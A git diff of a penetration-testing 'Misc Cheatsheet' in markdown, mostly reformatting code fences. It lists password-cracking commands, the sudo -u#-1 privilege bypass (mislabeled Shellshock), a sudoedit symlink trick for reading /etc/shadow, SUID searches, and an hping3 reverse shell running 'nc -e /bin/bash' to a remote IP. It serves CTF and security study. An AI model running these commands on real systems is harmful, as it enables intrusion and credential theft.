@@ -1,7 +1,4 @@
-Title: Misc Cheatsheet
-Slug: misc/cheatsheet
-Date: 1957-01-01 00:00
-Category: Cheatsheet
+# Misc Cheatsheet
 
 ## Cracking & Bruteforcing
 
@@ -13,17 +10,17 @@ Cool tools to generate username wordlists:
 
 Crack salted SHA512 hash with john the ripper:
 
-~~~
+```
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format='dynamic=sha512($p.$s)'
-~~~
+```
 
 **Note**: hashes need to be formatted as `hash$salt`
 
 Crack a zip archive:
 
-~~~
+```
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
-~~~
+```
 
 ## Forensics
 
@@ -33,67 +30,67 @@ Reference: https://blog.onfvp.com/post/volatility-cheatsheet/
 
 True Crypt (vol2) info from memory dump:
 
-~~~
+```
 vol2 --profile 'Win7SP1x86_23418' -f TrueSecrets.raw truecryptsummary
-~~~
+```
 
 Search and dump files (vol3):
 
-~~~
+```
 vol -f <mem dump> windows.filescan.FileScan
 
 vol -f <mem dump> windows.dumpfiles.DumpFiles --physaddr <addr from prev command>
-~~~
+```
 
 ### Linux Processes
 
-~~~
+```
 // -e trace= read or write events
 // -xx = hex instead of ascii
 
 strace [-e trace=<read|write>] [-xx] [-s <max string length>] -p <pid>
-~~~
+```
 
 ## Java
 
 Create executable jar:
 
-~~~
+```
 jar cvfe Payload.jar Payload *.class
-~~~
+```
 
 ## Javascript
 
 ### Electron
 
 Extract packaged application:
-~~~
+```
 npm install asar # if not installed
 npx asar extract <app>.asar <destination>
-~~~
+```
 
 Re-pack application:
 
-~~~
+```
 npx asar pack <source> <app>.asar
-~~~
+```
 
 Enable dev console in code:
 
-~~~
+```
 win.webContents.openDevTools();
-~~~
+```
 
 Setup proxy:
 
-~~~
+```
 # Add in code
 app.commandLine.appendSwitch('proxy-server','127.0.0.1:8080') # Set proxy
 app.commandLine.appendSwitch('ignore-certificate-errors') # Do not validate proxy certificate
 
 # Run from shelll
 > electron . --proxy-server=127.0.0.1:8080 --ignore-certificate-errors 
-~~~
+```
 
 ## Linux
 
@@ -101,15 +98,15 @@ app.commandLine.appendSwitch('ignore-certificate-errors') # Do not validate prox
 
  Running command for current process:
  
-~~~
+```
 /proc/self/cmdline
-~~~
+```
 
 Environment variables for current process:
 
-~~~
+```
 /proc/self/environ
-~~~
+```
 
 | clear_refs   | Clears page referenced bits shown in smaps output                                                                           |
 | ------------ | --------------------------------------------------------------------------------------------------------------------------- |
@@ -134,21 +131,21 @@ Environment variables for current process:
 
 All available network interfaces:
 
-~~~
+```
 /proc/net/arp
-~~~
+```
 
 Network Interface Hardware address:
 
-~~~
+```
 /sys/class/net/<if>/address
-~~~
+```
 
 Having `root` privileges, it's possible to access the root filesystem `/` by mean of `/proc` as follows:
 
-~~~
+```
 /proc/1/task/1/root
-~~~
+```
 
 **Note**: this may be useful when achieving limited Path Traversal in containers 
 
@@ -176,108 +173,108 @@ Unsafe arithmetic expression in bash script can lead to command injection and pr
 
 Check for shared object injection entry points using strace. **strace** is a tool used to trace system calls and signals.
 
-~~~
+```
 strace /usr/local/bin/<binary> 2>&1 | grep -iE "open|access|no such file"
-~~~
+```
 
 #### Shellshock
 
 CVE-2019-14287:
 
-~~~
+```
 sudo -u#-1 /bin/bash
-~~~
+```
 
 #### Sudo
 
 - Always check if **secure_path** is set with *sudo -l*. If not, it's possible to alter PATH environment variable in order to exploit binaries with relative path.
 - If the user has root privileges on some binary allowing to write/read file contents (es: sudoedit, nano, vim, cat, ...), it's possible to exfiltrate protected content using a symlink:
 
-~~~
+```
 ES: (ALL, ALL) sudoedit /some/path/filename.txt
 
 1. ln -s /etc/shadow /some/path/filename.txt
 2. sudoedit /some/path/filename.txt
-~~~
+```
 
 - If env_keep+=LD_PRELOAD and env_keep+=LD_LIBRARY_PATH are set, it's possible to compile some malicious code and replace dynamically loaded libraries used by a binary with sudo privileges.
 	- Note: **LD_PRELOAD** loads a shared object before any others when a program is run. **LD_LIBRARY_PATH** provides a list of directories where shared libraries are searched for first.
 
-~~~shell
+```shell
 // Get dynamic libraries for a binary
 ldd bin
-~~~
+```
 #### File and Permissions
 
 Find files/directories with SUID set:
 
-~~~shell
+```shell
 find / -type f -perm /4000 2> /dev/null
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -perm -u=s -type f 2>/dev/null
-~~~
+```
 
 Find files/directories with GUID set:
 
-~~~shell
+```shell
 find / -perm /2000 2> /dev/null
 find / -perm -g=s -type f 2>/dev/null
-~~~
+```
 
 Find all writable files and directories:
 
-~~~shell
+```shell
 find / -writable -type f 2>/dev/null
 find / -writable -type d 2>/dev/null
-~~~
+```
 
 ### Reverse Shells
 
 Reverse shell though `hping3`:
 
-~~~
+```
 Server: sudo /usr/sbin/hping3 --icmp --listen test -s 1234 192.168.56.108 | /bin/sh
 
 Client: sudo hping3 --icmp -c 1 -E payload -d 512 -p 1234 -I eth1 192.168.56.108
 
 Payload: dummymessagetestsudo nc.traditional -e /bin/bash '192.168.56.108' '8090'
-~~~
+```
 
  Upgrade shell to TTY when no python available (example: docker container):
 
-~~~
+```
 SHELL=/bin/bash script -q /dev/null
 
 stty raw -echo && fg
-~~~
+```
 
 ### Utils
 
 Get a portion of a file:
 
-~~~
+```
 file tail -c "$((0x7E8D6 + 1))" | head -c "$((0x8AD5D - 0x7E8D6))" >result
-~~~
+```
 
 Delete a file which name starts with `--`:
 
-~~~
+```
 rm -- --help
-~~~
+```
 
 **Note**: `--` makes `rm` stop parsing command line options 
 ## Python Utils
 
 Use pdb debugger ([pdb](https://docs.python.org/3/library/pdb.html)):
 
-~~~
+```
 python -m pdb myscript.py
-~~~
+```
 
 
 Zipslip script:
 
-~~~python
+```python
 import io
 import zipfile
 
@@ -292,7 +289,7 @@ with open('plugin.js', 'r') as f:
 
 with open('output.zip', 'wb') as f:
  f.write(output)
-~~~
+```
 
 
 ## Scripting Utilities
@@ -300,50 +297,50 @@ with open('output.zip', 'wb') as f:
 ### Bash
 Clear line in console output:
 
-~~~
+```
 echo -en "\033[2K\r$domain"
-~~~
+```
 
 Filter string by specified length range:
 
-~~~
+```
 echo 123 | awk 'length >= 3 && length <= 32'
-~~~
+```
 
 `wget` usage useful when missing `curl`:
 
-~~~
+```
 // -q = quiet
 // -O - = output to stdout
 
 wget -q -O - <target>
-~~~
+```
 
 ## Windows
 
 Enable system proxy from `regedit`:
 
-![[windows-proxy-from-registers.png]]
+![windows-proxy-from-registers](../images/misc/misc-cheatsheet/windows-proxy-from-registers.png)
 
 ### cmd
 
 Recursively search for directory or files:
 
-~~~
+```
 dir /s foo*
-~~~
+```
 
 Stop and (re)start service:
 
-~~~
+```
 sc <stop, start> <servicename>
-~~~
+```
 
 Add (persistent with flag `-P`) route:
 
-~~~cmd
+```cmd
 route -P ADD <subnet> MASK <netmask> <gateway> METRIC <value>
-~~~
+```
 
 ## Proxmox
 
